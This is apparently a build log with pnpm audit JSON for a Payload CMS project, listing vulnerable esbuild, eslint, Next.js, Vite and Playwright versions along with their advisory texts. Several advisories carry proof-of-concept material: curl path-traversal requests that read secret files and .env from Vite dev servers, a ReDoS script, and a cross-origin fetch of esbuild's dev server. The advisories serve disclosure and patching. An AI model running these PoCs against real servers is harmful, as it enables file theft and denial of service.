@@ -1,0 +1,876 @@
+time="2025-12-16T09:43:33Z" level=warning msg="/srv/payload/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion"
+ Container payload-payload-build-run-ad7b3914f7b7 Creating 
+ Container payload-payload-build-run-ad7b3914f7b7 Created 
+! Corepack is about to download https://registry.npmjs.org/pnpm/-/pnpm-10.12.4.tgz
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1106734,
+          "path": ".>eslint>@eslint/plugin-kit",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@eslint/plugin-kit",
+      "target": "0.3.5",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1107325,
+          "path": ".>@vitejs/plugin-react>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107329,
+          "path": ".>@vitejs/plugin-react>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1109136,
+          "path": ".>@vitejs/plugin-react>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1109534,
+          "path": ".>sharp>tar-fs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "tar-fs",
+      "target": "3.1.1",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1109802,
+          "path": ".>@eslint/eslintrc>js-yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "js-yaml",
+      "target": "4.1.1",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": ".>@payloadcms/next>@payloadcms/graphql>tsx>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "next",
+      "resolves": [
+        {
+          "id": 1107228,
+          "path": ".>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107514,
+          "path": ".>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1107515,
+          "path": ".>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111378,
+          "path": ".>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111387,
+          "path": ".>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "playwright",
+      "resolves": [
+        {
+          "id": 1109208,
+          "path": ".>playwright",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tar-fs",
+      "resolves": [
+        {
+          "id": 1109532,
+          "path": ".>sharp>prebuild-install>tar-fs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nodemailer",
+      "resolves": [
+        {
+          "id": 1109804,
+          "path": ".>@payloadcms/email-nodemailer>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111074,
+          "path": ".>@payloadcms/email-nodemailer>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1109843,
+          "path": ".>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.23.1",
+          "paths": [
+            ".>@payloadcms/next>@payloadcms/graphql>tsx>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1106734": {
+      "findings": [
+        {
+          "version": "0.3.3",
+          "paths": [
+            ".>eslint>@eslint/plugin-kit"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/eslint/rewrite/security/advisories/GHSA-xffm-g5w8-qvg7\n- https://github.com/eslint/rewrite/commit/b283f64099ad6c6b5043387c091691d21b387805\n- https://github.com/advisories/GHSA-xffm-g5w8-qvg7",
+      "created": "2025-07-18T20:39:12.000Z",
+      "id": 1106734,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `ConfigCommentParser#parseJSONLikeConfig` API is vulnerable to a Regular Expression Denial of Service (ReDoS) attack in its only argument.\n\n### Details\n\nThe regular expression at [packages/plugin-kit/src/config-comment-parser.js:158](https://github.com/eslint/rewrite/blob/bd4bf23c59f0e4886df671cdebd5abaeb1e0d916/packages/plugin-kit/src/config-comment-parser.js#L158) is vulnerable to a quadratic runtime attack because the grouped expression is not anchored. This can be solved by prepending the regular expression with `[^-a-zA-Z0-9/]`.\n\n### PoC\n\n```javascript\nconst { ConfigCommentParser } = require(\"@eslint/plugin-kit\");\n\nconst str = `${\"A\".repeat(1000000)}?: 1 B: 2`;\n\nconsole.log(\"start\")\nvar parser = new ConfigCommentParser();\nconsole.log(parser.parseJSONLikeConfig(str));\nconsole.log(\"end\")\n\n// run `npm i @eslint/plugin-kit@0.3.3` and `node attack.js`\n// then the program will stuck forever with high CPU usage\n```\n\n### Impact\n\nThis is a Regular Expression Denial of Service attack which may lead to blocking execution and high CPU usage.",
+      "reported_by": null,
+      "title": "@eslint/plugin-kit is vulnerable to Regular Expression Denial of Service attacks through ConfigCommentParser",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "@eslint/plugin-kit",
+      "vulnerable_versions": "<0.3.4",
+      "github_advisory_id": "GHSA-xffm-g5w8-qvg7",
+      "recommendation": "Upgrade to version 0.3.4 or later",
+      "patched_versions": ">=0.3.4",
+      "updated": "2025-07-28T17:34:45.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-xffm-g5w8-qvg7"
+    },
+    "1107228": {
+      "findings": [
+        {
+          "version": "15.3.6",
+          "paths": [
+            ".>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-g5qg-72qw-gw5v\n- https://github.com/vercel/next.js/pull/82114\n- https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd\n- https://vercel.com/changelog/cve-2025-57752\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57752\n- https://github.com/advisories/GHSA-g5qg-72qw-gw5v",
+      "created": "2025-08-29T22:06:22.000Z",
+      "id": 1107228,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in Next.js Image Optimization has been fixed in v15.4.5 and v14.2.31. When images returned from API routes vary based on request headers (such as `Cookie` or `Authorization`), these responses could be incorrectly cached and served to unauthorized users due to a cache key confusion bug.\n\nAll users are encouraged to upgrade if they use API routes to serve images that depend on request headers and have image optimization enabled.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57752)",
+      "reported_by": null,
+      "title": "Next.js Affected by Cache Key Confusion for Image Optimization API Routes",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57752"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <=15.4.4",
+      "github_advisory_id": "GHSA-g5qg-72qw-gw5v",
+      "recommendation": "Upgrade to version 15.4.5 or later",
+      "patched_versions": ">=15.4.5",
+      "updated": "2025-09-03T13:01:55.000Z",
+      "cvss": {
+        "score": 6.2,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-g5qg-72qw-gw5v"
+    },
+    "1107325": {
+      "findings": [
+        {
+          "version": "7.0.0",
+          "paths": [
+            ".>@vitejs/plugin-react>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-g4jq-h2w9-997c\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58751\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb\n- https://github.com/vitejs/vite/commit/09f2b52e8d5907f26602653caf41b3a56692600d\n- https://github.com/vitejs/vite/commit/4f1c35bcbb5830290c694aa14b6789e07450f069\n- https://github.com/vitejs/vite/commit/63e2a5d232218f3f8d852056751e609a5367aaec\n- https://github.com/vitejs/vite/commit/e11d24008b97d4ca731ecc1a3b95260a6d12e7e0\n- https://github.com/advisories/GHSA-g4jq-h2w9-997c",
+      "created": "2025-09-09T20:55:56.000Z",
+      "id": 1107325,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nFiles starting with the same name with the public directory were served bypassing the `server.fs` settings.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- uses [the public directory feature](https://vite.dev/guide/assets.html#the-public-directory) (enabled by default)\n- a symlink exists in the public directory\n\n### Details\nThe [servePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L79) function is in charge of serving public files from the server. It returns the [viteServePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L106) function which runs the needed tests and serves the page. The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.\n\nIn the case of public pages, the serving function is [provided with the path to the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is \"/www/public\", and the requested file is \"myfile\", the code will join them to the string \"/www/public/myfile\". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.\n\nSince [sirv trims the trailing slash of the public directory](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at \"/www\", and the public directory is at \"/www/p\", if the created path will be \"/www/private.txt\", the startsWith function will still return true, because the string \"/www/private.txt\" starts with  \"/www/p\". To achieve this, the attacker will use \"..\" to ask for the file \"../private.txt\". The code will then join it to the \"/www/p\" string, and will receive \"/www/p/../private.txt\". Then, the normalize function will return \"/www/private.txt\", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that).\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\nmkdir p\ncd p\nln -s a b\ncd ..\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({publicDir: path.resolve(__dirname, \"p/\"), server: {fs: {deny: [path.resolve(__dirname, \"private.txt\")]}}})' > vite.config.js\necho  \"secret\" > private.txt\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/private.txt'`\n\nYou will receive a 403 HTTP Response,  because private.txt is denied.\n\nNow in the same shell run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/../private.txt'`\n\nYou will receive the contents of private.txt.\n\n### Related links\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb",
+      "reported_by": null,
+      "title": "Vite middleware may serve files starting with the same name with the public directory",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-58751"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.0.6",
+      "github_advisory_id": "GHSA-g4jq-h2w9-997c",
+      "recommendation": "Upgrade to version 7.0.7 or later",
+      "patched_versions": ">=7.0.7",
+      "updated": "2025-09-09T20:55:57.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200",
+        "CWE-284"
+      ],
+      "url": "https://github.com/advisories/GHSA-g4jq-h2w9-997c"
+    },
+    "1107329": {
+      "findings": [
+        {
+          "version": "7.0.0",
+          "paths": [
+            ".>@vitejs/plugin-react>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-jqfw-vq24-v9c3\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58752\n- https://github.com/vitejs/vite/commit/0ab19ea9fcb66f544328f442cf6e70f7c0528d5f\n- https://github.com/vitejs/vite/commit/14015d794f69accba68798bd0e15135bc51c9c1e\n- https://github.com/vitejs/vite/commit/482000f57f56fe6ff2e905305100cfe03043ddea\n- https://github.com/vitejs/vite/commit/6f01ff4fe072bcfcd4e2a84811772b818cd51fe6\n- https://github.com/vitejs/vite/blob/v7.1.5/packages/vite/CHANGELOG.md\n- https://github.com/advisories/GHSA-jqfw-vq24-v9c3",
+      "created": "2025-09-09T20:54:42.000Z",
+      "id": 1107329,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nAny HTML files on the machine were served regardless of the `server.fs` settings.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- `appType: 'spa'` (default) or `appType: 'mpa'` is used\n\nThis vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served.\n\n### Details\nThe [serveStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is \".html\"](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\necho  \"secret\" > /tmp/secret.html\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'`\n\nThe contents of /tmp/secret.html will be returned.\n\nThis will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\n\n```\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files/*\")]}}})'  >  [vite.config.js](http://vite.config.js)\nmkdir secret_files\necho \"secret txt\" > secret_files/secret.txt\necho \"secret html\" > secret_files/secret.html\nnpm run dev\n\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`\n\nYou will receive a 403 HTTP Response,  because everything in the secret_files directory is denied.\n\nNow in the same shell run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`\n\nYou will receive the contents of secret_files/secret.html.",
+      "reported_by": null,
+      "title": "Vite's `server.fs` settings were not applied to HTML files",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-58752"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.0.6",
+      "github_advisory_id": "GHSA-jqfw-vq24-v9c3",
+      "recommendation": "Upgrade to version 7.0.7 or later",
+      "patched_versions": ">=7.0.7",
+      "updated": "2025-09-09T20:54:43.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-23",
+        "CWE-200",
+        "CWE-284"
+      ],
+      "url": "https://github.com/advisories/GHSA-jqfw-vq24-v9c3"
+    },
+    "1107514": {
+      "findings": [
+        {
+          "version": "15.3.6",
+          "paths": [
+            ".>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-xv57-4mr9-wg8v\n- https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd\n- http://vercel.com/changelog/cve-2025-55173\n- https://nvd.nist.gov/vuln/detail/CVE-2025-55173\n- https://vercel.com/changelog/cve-2025-55173\n- https://github.com/advisories/GHSA-xv57-4mr9-wg8v",
+      "created": "2025-08-29T21:59:55.000Z",
+      "id": 1107514,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in **Next.js Image Optimization** has been fixed in **v15.4.5** and **v14.2.31**. The issue allowed attacker-controlled external image sources to trigger file downloads with arbitrary content and filenames under specific configurations. This behavior could be abused for phishing or malicious file delivery.\n\nAll users relying on `images.domains` or `images.remotePatterns` are encouraged to upgrade and verify that external image sources are strictly validated.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-55173)",
+      "reported_by": null,
+      "title": "Next.js Content Injection Vulnerability for Image Optimization",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-55173"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <=15.4.4",
+      "github_advisory_id": "GHSA-xv57-4mr9-wg8v",
+      "recommendation": "Upgrade to version 15.4.5 or later",
+      "patched_versions": ">=15.4.5",
+      "updated": "2025-09-11T15:35:25.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20"
+      ],
+      "url": "https://github.com/advisories/GHSA-xv57-4mr9-wg8v"
+    },
+    "1107515": {
+      "findings": [
+        {
+          "version": "15.3.6",
+          "paths": [
+            ".>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-4342-x723-ch2f\n- https://github.com/vercel/next.js/commit/9c9aaed5bb9338ef31b0517ccf0ab4414f2093d8\n- https://vercel.com/changelog/cve-2025-57822\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57822\n- https://github.com/advisories/GHSA-4342-x723-ch2f",
+      "created": "2025-08-29T21:33:09.000Z",
+      "id": 1107515,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in **Next.js Middleware** has been fixed in **v14.2.32** and **v15.4.7**. The issue occurred when request headers were directly passed into `NextResponse.next()`. In self-hosted applications, this could allow Server-Side Request Forgery (SSRF) if certain sensitive headers from the incoming request were reflected back into the response.\n\nAll users implementing custom middleware logic in self-hosted environments are strongly encouraged to upgrade and verify correct usage of the `next()` function.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57822)",
+      "reported_by": null,
+      "title": "Next.js Improper Middleware Redirect Handling Leads to SSRF",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57822"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0-canary.0 <15.4.7",
+      "github_advisory_id": "GHSA-4342-x723-ch2f",
+      "recommendation": "Upgrade to version 15.4.7 or later",
+      "patched_versions": ">=15.4.7",
+      "updated": "2025-09-11T15:41:03.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-4342-x723-ch2f"
+    },
+    "1109136": {
+      "findings": [
+        {
+          "version": "7.0.0",
+          "paths": [
+            ".>@vitejs/plugin-react>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7\n- https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed\n- https://nvd.nist.gov/vuln/detail/CVE-2025-62522\n- https://github.com/advisories/GHSA-93m4-6634-74q7",
+      "created": "2025-10-20T19:54:28.000Z",
+      "id": 1109136,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n<img width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" />",
+      "reported_by": null,
+      "title": "vite allows server.fs.deny bypass via backslash on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-62522"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=7.0.0 <=7.0.7",
+      "github_advisory_id": "GHSA-93m4-6634-74q7",
+      "recommendation": "Upgrade to version 7.0.8 or later",
+      "patched_versions": ">=7.0.8",
+      "updated": "2025-10-21T14:51:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-93m4-6634-74q7"
+    },
+    "1109208": {
+      "findings": [
+        {
+          "version": "1.50.0",
+          "paths": [
+            ".>playwright"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-59288\n- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59288\n- https://github.com/SocketDev/security-research/security/advisories/GHSA-qxm8-4v54-964r\n- https://github.com/microsoft/playwright/pull/37532\n- https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570\n- https://github.com/microsoft/playwright/releases/tag/v1.55.1\n- https://github.com/microsoft/playwright/releases/tag/v1.56.0\n- https://github.com/advisories/GHSA-7mvr-c777-76hp",
+      "created": "2025-10-14T18:30:36.000Z",
+      "id": 1109208,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nUse of `curl` with the `-k` (or `--insecure`) flag in installer scripts allows attackers to deliver arbitrary executables via Man-in-the-Middle (MitM) attacks. This can lead to full system compromise, as the downloaded files are installed as privileged applications.\n\n### Details\nThe following scripts in the `microsoft/playwright` repository at commit [`bee11cbc28f24bd18e726163d0b9b1571b4f26a8`](https://github.com/microsoft/playwright/commit/bee11cbc28f24bd18e726163d0b9b1571b4f26a8) use `curl -k` to fetch and install executable packages without verifying the authenticity of the SSL certificate:\n\n\n- [`packages/playwright-core/bin/reinstall_chrome_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_chrome_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_stable_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_dev_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_dev_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_stable_mac.sh)\n\nIn each case, the shell scripts download a browser installer package using `curl -k` and immediately install it:\n\n```shell\ncurl --retry 3 -o ./<pkg-file> -k <url>\nsudo installer -pkg /tmp/<pkg-file> -target /\n```\n\nDisabling SSL verification (`-k`) means the download can be intercepted and replaced with malicious content.\n\n### PoC\nA high-level exploitation scenario:\n\n1. An attacker performs a MitM attack on a network where the victim runs one of these scripts.\n2. The attacker intercepts the HTTPS request and serves a malicious package (for example, a trojaned browser installer).\n3. Because `curl -k` is used, the script downloads and installs the attacker's payload without any certificate validation.\n4. The attacker's code is executed with system privileges, leading to full compromise.\n\nNo special configuration is needed: simply running these scripts on any untrusted or hostile network is enough.\n\n### Impact\nThis is a critical Remote Code Execution (RCE) vulnerability due to 